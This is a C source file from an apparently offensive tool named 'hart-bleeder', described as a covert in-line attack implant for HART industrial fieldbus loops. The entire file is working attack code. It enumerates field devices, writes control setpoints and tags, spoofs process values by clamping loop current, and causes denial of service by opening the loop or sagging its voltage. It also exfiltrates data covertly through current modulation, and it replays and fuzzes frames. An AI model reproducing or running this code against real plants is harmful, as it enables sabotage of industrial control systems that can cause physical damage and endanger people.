/*
 * hart-bleeder — attacks.c
 * High-level attack operations: enumeration, PV spoofing, setpoint
 * writes, DoS, covert channel exfiltration, burst capture, replay
 * and fuzzing for the HART Fieldbus Covert In-Line Attack Implant.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#include "board.h"
#include "registers.h"
#include "hart_stack.h"
#include "loop_drv.h"
#include "attacks.h"
#include "console.h"
#include "storage.h"
#include "modem_drv.h"
#include <string.h>

/* ── Enumeration ─────────────────────────────────────────────── */
int attacks_enumerate(hart_device_t *out, uint8_t max)
{
    int n = hart_enumerate_bus();
    if (n <= 0) return ATK_NO_DEVICE;
    uint8_t copy = (uint8_t)(n > max ? max : n);
    memcpy(out, g_hart.devices, copy * sizeof(hart_device_t));
    return copy;
}

/* ── Read PV ─────────────────────────────────────────────────── */
int attacks_read_pv(uint8_t addr, float *pv_pct, float *pv_ma)
{
    hart_frame_t resp;
    int rc = hart_send_cmd(addr, HART_CMD_READ_PV, NULL, 0, &resp, 800);
    if (rc != 0) return ATK_TIMEOUT;
    if (resp.status[0] != HART_STATUS_OK) return ATK_STATUS_ERR;
    /* Cmd 1 response: PV units (1B) + PV float (4B) + loop current (4B) */
    if (resp.data_len >= 5 && pv_pct) {
        /* PV is a 4-byte IEEE754 float in the response (offset 1) */
        uint8_t fbuf[4];
        memcpy(fbuf, &resp.data[1], 4);
        float pv;
        memcpy(&pv, fbuf, 4);
        /* Convert to % of span (device-specific; we approximate) */
        *pv_pct = pv;
    }
    if (resp.data_len >= 9 && pv_ma) {
        uint8_t fbuf[4];
        memcpy(fbuf, &resp.data[5], 4);
        float ma;
        memcpy(&ma, fbuf, 4);
        *pv_ma = ma;
    }
    return ATK_OK;
}

/* ── Write PV setpoint (cmd 35) — destructive ───────────────── */
int attacks_write_setpoint(uint8_t addr, float setpoint_pct)
{
    if (setpoint_pct < 0) setpoint_pct = 0;
    if (setpoint_pct > 100) setpoint_pct = 100;
    /* Cmd 35 payload: PV units code (1B) + PV float (4B) */
    uint8_t payload[5];
    payload[0] = 0x24;   /* units: % (placeholder) */
    memcpy(&payload[1], &setpoint_pct, 4);

    hart_frame_t resp;
    int rc = hart_send_cmd(addr, HART_CMD_WRITE_PV, payload, 5, &resp, 1000);
    if (rc != 0) return ATK_TIMEOUT;
    if (resp.status[0] != HART_STATUS_OK) {
        console_printf("setpoint write rejected: %s\r\n",
                       hart_status_str(resp.status[0]));
        return ATK_MODE_REJECT;
    }
    return ATK_OK;
}

/* ── Write device tag (cmd 17) ───────────────────────────────── */
int attacks_write_tag(uint8_t addr, const char *tag, uint8_t tag_len)
{
    if (tag_len > 6) tag_len = 6;
    /* Cmd 17 payload: packed-ASCII tag (6 bytes), descriptor (12), date (3).
     * We only write the tag; descriptor & date zeroed.
     */
    uint8_t payload[21];
    memset(payload, 0x20, sizeof(payload));  /* spaces */
    memcpy(payload, tag, tag_len);
    payload[6] = 0;   /* separator */
    hart_frame_t resp;
    int rc = hart_send_cmd(addr, HART_CMD_WRITE_TAG, payload, 21, &resp, 1000);
    if (rc != 0) return ATK_TIMEOUT;
    if (resp.status[0] != HART_STATUS_OK) return ATK_STATUS_ERR;
    return ATK_OK;
}

/* ── Force loop current (PV spoofing at the physical layer) ──── */
int attacks_spoof_pv(float target_ma)
{
    loop_set_mode(LOOP_MODE_CLAMP);
    return loop_set_current(target_ma);
}

/* ── DoS: open the loop ─────────────────────────────────────── */
int attacks_loop_dos(uint32_t duration_ms)
{
    loop_set_mode(LOOP_MODE_OPEN_LOOP);
    loop_open_circuit(1);
    system_delay_ms(duration_ms);
    loop_open_circuit(0);
    loop_set_mode(LOOP_MODE_PASSIVE);
    return ATK_OK;
}

/* ── DoS: voltage sag ───────────────────────────────────────── */
int attacks_sag_inject(uint32_t duration_ms, float sag_pct)
{
    loop_set_mode(LOOP_MODE_SAG);
    int rc = loop_induce_sag(duration_ms, sag_pct);
    loop_set_mode(LOOP_MODE_PASSIVE);
    return (rc == 0) ? ATK_OK : ATK_FAULT;
}

/* ── Covert exfiltration: ±0.5 mA FSK ────────────────────────
 * Frame: [0xAA sync byte] [len] [payload] [XOR chk]
 * Each bit: 1 = +0.5mA, 0 = -0.5mA, 833us per bit (1200 baud).
 */
int attacks_covert_exfil(const uint8_t *data, uint16_t len)
{
    loop_set_mode(LOOP_MODE_COVERT);

    /* Build frame with sync preamble */
    uint8_t frame[128 + 4];
    if (len > 128) len = 128;
    frame[0] = 0xAA;   /* sync */
    frame[1] = 0xAA;
    frame[2] = (uint8_t)len;
    memcpy(&frame[3], data, len);
    uint8_t chk = 0;
    for (uint16_t i = 0; i < 3 + len; i++) chk ^= frame[i];
    frame[3 + len] = chk;
    uint16_t total = 3 + len + 1;

    /* Modulate each bit via loop current deltas */
    for (uint16_t i = 0; i < total; i++) {
        uint8_t byte = frame[i];
        for (int b = 7; b >= 0; b--) {
            loop_covert_modulate((byte >> b) & 1);
        }
    }
    loop_set_mode(LOOP_MODE_PASSIVE);
    return ATK_OK;
}

/* ── Covert receive: demodulate ±0.5 mA FSK ─────────────────── */
int attacks_covert_recv(uint8_t *out, uint16_t max, uint16_t *got,
                        uint32_t timeout_ms)
{
    uint32_t t0 = system_millis();
    *got = 0;

    /* Look for sync bytes (0xAA 0xAA) by sampling loop current */
    float base = loop_current_ma();
    float hi_thresh = base + 0.25f;
    float lo_thresh = base - 0.25f;

    /* Synchronize: wait for a rising edge above hi_thresh */
    while ((system_millis() - t0) < timeout_ms) {
        float i = loop_current_ma();
        if (i > hi_thresh) break;
    }
    if ((system_millis() - t0) >= timeout_ms) return ATK_TIMEOUT;

    /* Read sync + len + payload + chk */
    uint8_t rxbuf[128 + 4];
    uint16_t ridx = 0;
    while (ridx < sizeof(rxbuf) && (system_millis() - t0) < timeout_ms) {
        uint8_t byte = 0;
        for (int b = 7; b >= 0; b--) {
            system_delay_us(HART_BIT_US / 2);   /* sample mid-bit */
            float i = loop_current_ma();
            uint8_t bit = (i > base) ? 1 : 0;
            byte |= (bit << b);
            system_delay_us(HART_BIT_US / 2);
        }
        rxbuf[ridx++] = byte;
        if (ridx >= 3) {
            uint16_t expected = 3 + rxbuf[2] + 1;
            if (ridx >= expected) break;
        }
    }
    if (ridx < 4) return ATK_TIMEOUT;

    /* Validate sync + checksum */
    if (rxbuf[0] != 0xAA || rxbuf[1] != 0xAA) return ATK_STATUS_ERR;
    uint16_t plen = rxbuf[2];
    uint8_t chk = 0;
    for (uint16_t i = 0; i < 3 + plen; i++) chk ^= rxbuf[i];
    if (chk != rxbuf[3 + plen]) return ATK_STATUS_ERR;

    uint16_t copy = (plen > max) ? max : plen;
    memcpy(out, &rxbuf[3], copy);
    *got = copy;
    return ATK_OK;
}

/* ── Burst capture: record frames for offline analysis ──────── */
int attacks_burst_capture(uint32_t duration_ms)
{
    uint32_t t0 = system_millis();
    uint16_t count = 0;
    while ((system_millis() - t0) < duration_ms) {
        hart_frame_t f;
        if (hart_recv_frame(&f, 200) == 0) {
            storage_log_frame(&f, sizeof(f));
            count++;
        }
    }
    console_printf("captured %u frames\r\n", count);
    return count;
}

/* ── Replay ─────────────────────────────────────────────────── */
int attacks_replay_frame(const uint8_t *frame, uint16_t len)
{
    return hart_send_raw(frame, len);
}

/* ── Fuzz: send malformed frames ────────────────────────────── */
int attacks_fuzz(uint8_t addr, uint16_t count)
{
    uint8_t buf[HART_MAX_FRAME + 32];
    for (uint16_t i = 0; i < count; i++) {
        uint16_t n = 0;
        /* Preamble */
        for (int p = 0; p < 6; p++) buf[n++] = 0xFF;
        /* Start byte — randomly pick short or long */
        buf[n++] = (i & 1) ? HART_LONG_START : HART_SHORT_START;
        /* Address — corrupted on some iterations */
        buf[n++] = (i % 4 == 0) ? 0xFF : (addr | 0x80);
        /* Command — fuzz random commands */
        buf[n++] = (uint8_t)(i & 0x7F);
        /* Byte count — sometimes absurd */
        buf[n++] = (i % 8 == 0) ? 0xFE : (uint8_t)(i & 0x1F);
        /* Random payload */
        for (int p = 0; p < (i & 0x1F); p++) buf[n++] = (uint8_t)(i * 13 + p);
        /* Wrong checksum on some frames */
        buf[n] = (i % 3 == 0) ? 0x00 : hart_checksum(&buf[6], n - 6);
        n++;
        hart_send_raw(buf, n);
        system_delay_ms(40);
    }
    return ATK_OK;
}

/* ── Pretty-print ────────────────────────────────────────────── */
void attacks_print_devices(const hart_device_t *devs, uint8_t n)
{
    console_printf("Found %u HART device(s):\r\n", n);
    for (uint8_t i = 0; i < n; i++) {
        console_printf("  [%u] addr=%u mfr=0x%02X type=0x%02X id=%02X%02X%02X%02X%02X\r\n",
                       i, devs[i].poll_addr, devs[i].manufacturer,
                       devs[i].dev_type, devs[i].long_addr[0],
                       devs[i].long_addr[1], devs[i].long_addr[2],
                       devs[i].long_addr[3], devs[i].long_addr[4]);
    }
}